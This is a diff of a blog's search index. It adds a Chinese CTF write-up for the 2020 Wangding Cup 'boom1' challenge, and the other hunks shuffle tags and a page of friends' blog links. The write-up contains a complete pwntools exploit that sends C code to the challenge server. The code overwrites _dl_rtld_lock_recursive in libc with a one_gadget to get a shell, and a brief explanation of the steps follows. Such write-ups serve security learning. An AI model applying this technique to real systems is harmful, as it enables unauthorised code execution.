@@ -4,6 +4,29 @@
   
     
     <entry>
+      <title>网鼎杯_2020</title>
+      <link href="/2020/05/10/Competition/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/"/>
+      <url>/2020/05/10/Competition/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/</url>
+      
+        <content type="html"><![CDATA[<p>菜鸟不配打CTF,和De1CTF一样,打过之后才知道自己是多么的菜</p><a id="more"></a><h2 id="boom1"><a href="#boom1" class="headerlink" title="boom1"></a>boom1</h2><p><a href="./boom1/exp.py">Exploit</a> <a href="./boom1/main">Main</a> <a href="./boom1/libc-2.23.so">LIBC</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#from LD import*</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#LD=change_ld('./main','./ld-2.23.so')</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#p = LD.process(env=&#123;'LD_PRELOAD':'./libc-2.23.so'&#125;)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">libc =ELF(<span class="string">'./libc-2.23.so'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'182.92.73.10'</span>,<span class="number">24573</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">context.log_level =<span class="string">'DEBUG'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="string">char *s;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"><span class="string">char *n;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"><span class="string">char *ptr;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"><span class="string">int main()</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"><span class="string">&#123;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"><span class="string">s = "FMYY";</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"><span class="string">n = s - (0x7F8FE6E5C028 - 0x7F8FE6933000);</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"><span class="string">s = n + 6229832 - 3848 + 8;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"><span class="string">s[0] = 0;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"><span class="string">s = n + 6229832;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"><span class="string">ptr = 0xCD0F3 + n;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"><span class="string">s[0] = (ptr)&amp;0xFF;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"><span class="string">s[1] = (ptr&gt;&gt;8)&amp;0xFF;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"><span class="string">s[2] = (ptr&gt;&gt;16)&amp;0xFF;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"><span class="string">printf("%p %p %p",n,ptr,*(int *)s);</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"><span class="string">&#125;'''</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">payload = payload.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure><p>程序的作用就是可编译执行写好的C代码,限制也比较多,利用黑盒做的,经过学长的提点之后,C代码可实现任意写  </p><pre><code>1.在C代码中,定义在int main之外的指针变量是位于libc上面的,然后可以通过计算获得指针变量对于libc_base的偏移量,然后修改指针的指向,令指针n指向libc_base  2.由于libc-2.23中所有的one_gadget皆不满足执行条件,只能手动修改,通过四则运算与动态调试后,令[_rtld_global+8] == 0,则可满足0xCD0F3的执行条件  3.后续则是计算_dl_rtld_lock_recursive的偏移量,单字节修改末三位字节为one_gadget</code></pre><h2 id="boom2"><a href="#boom2" class="headerlink" title="boom2"></a>boom2</h2><p>先上一个,吃完饭回来上pwn2</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> PWN </tag>
+            
+            <tag> Partional </tag>
+            
+            <tag> 网鼎杯_2020 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Linux_Kernel_Pwn(ROP)</title>
       <link href="/2020/05/08/Kernel/Linux_Kernel_Pwn(%E4%BA%8C)/"/>
       <url>/2020/05/08/Kernel/Linux_Kernel_Pwn(%E4%BA%8C)/</url>
@@ -125,9 +148,9 @@
       
         <tags>
             
-            <tag> PWN </tag>
-            
             <tag> AWD </tag>
+            
+            <tag> PWN </tag>
             
         </tags>
       
@@ -580,22 +603,22 @@
     
     
     <entry>
-      <title>tags</title>
-      <link href="/tags/index.html"/>
-      <url>/tags/index.html</url>
+      <title>Links</title>
+      <link href="/links/index.html"/>
+      <url>/links/index.html</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<h3 id="0xFxxker"><a href="#0xFxxker" class="headerlink" title="0xFxxker"></a>0xFxxker</h3><p><a href="/">风沐云烟</a><br><a href="http://caoyi.site/" target="_blank" rel="noopener">Am473ur</a><br><a href="http://wh1sper.cn/" target="_blank" rel="noopener">Wh1sper</a><br><a href="http://leukpoint.top/" target="_blank" rel="noopener">LeukPoint</a><br><a href="http://clq0.top/" target="_blank" rel="noopener">Leon</a></p><h3 id="X1CT34M"><a href="#X1CT34M" class="headerlink" title="X1CT34M"></a>X1CT34M</h3><p><a href="http://blog.soreatu.com/" target="_blank" rel="noopener">Soreut</a><br><a href="http://blog.jylsec.com:23333/" target="_blank" rel="noopener">姬扬灵</a><br><a href="http://zihu4n.cn/" target="_blank" rel="noopener">zihu4n</a><br><a href="http://www.psbazx.com/" target="_blank" rel="noopener">皮三宝</a><br><a href="http://yulige.top/" target="_blank" rel="noopener">郁离歌丶</a><br><a href="http://120.79.211.91/" target="_blank" rel="noopener">C0SS4CK</a><br><a href="http://4eriri.top/" target="_blank" rel="noopener">4eriri</a></p><h3 id="通向大师傅们的神秘地址"><a href="#通向大师傅们的神秘地址" class="headerlink" title="通向大师傅们的神秘地址"></a>通向大师傅们的神秘地址</h3><p><a href="http://youn9.top/" target="_blank" rel="noopener">Youn9</a><br><a href="http://djstudy.top/" target="_blank" rel="noopener">Lime</a><br><a href="http://binlep.top/page/2/" target="_blank" rel="noopener">binLep</a><br><a href="https://l0ne1y.github.io/" target="_blank" rel="noopener">L0ne1y</a><br><a href="https://1p0ch.cn/" target="_blank" rel="noopener">1p0ch</a></p>]]></content>
       
     </entry>
     
     
     
     <entry>
-      <title>Links</title>
-      <link href="/links/index.html"/>
-      <url>/links/index.html</url>
+      <title>tags</title>
+      <link href="/tags/index.html"/>
+      <url>/tags/index.html</url>
       
-        <content type="html"><![CDATA[<h3 id="0xFxxker"><a href="#0xFxxker" class="headerlink" title="0xFxxker"></a>0xFxxker</h3><p><a href="/">风沐云烟</a><br><a href="http://caoyi.site/" target="_blank" rel="noopener">Am473ur</a><br><a href="http://wh1sper.cn/" target="_blank" rel="noopener">Wh1sper</a><br><a href="http://leukpoint.top/" target="_blank" rel="noopener">LeukPoint</a><br><a href="http://clq0.top/" target="_blank" rel="noopener">Leon</a></p><h3 id="X1CT34M"><a href="#X1CT34M" class="headerlink" title="X1CT34M"></a>X1CT34M</h3><p><a href="http://blog.soreatu.com/" target="_blank" rel="noopener">Soreut</a><br><a href="http://blog.jylsec.com:23333/" target="_blank" rel="noopener">姬扬灵</a><br><a href="http://zihu4n.cn/" target="_blank" rel="noopener">zihu4n</a><br><a href="http://www.psbazx.com/" target="_blank" rel="noopener">皮三宝</a><br><a href="http://yulige.top/" target="_blank" rel="noopener">郁离歌丶</a><br><a href="http://120.79.211.91/" target="_blank" rel="noopener">C0SS4CK</a><br><a href="http://4eriri.top/" target="_blank" rel="noopener">4eriri</a></p><h3 id="通向大师傅们的神秘地址"><a href="#通向大师傅们的神秘地址" class="headerlink" title="通向大师傅们的神秘地址"></a>通向大师傅们的神秘地址</h3><p><a href="http://youn9.top/" target="_blank" rel="noopener">Youn9</a><br><a href="http://djstudy.top/" target="_blank" rel="noopener">Lime</a><br><a href="http://binlep.top/page/2/" target="_blank" rel="noopener">binLep</a><br><a href="https://l0ne1y.github.io/" target="_blank" rel="noopener">L0ne1y</a><br><a href="https://1p0ch.cn/" target="_blank" rel="noopener">1p0ch</a></p>]]></content>
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
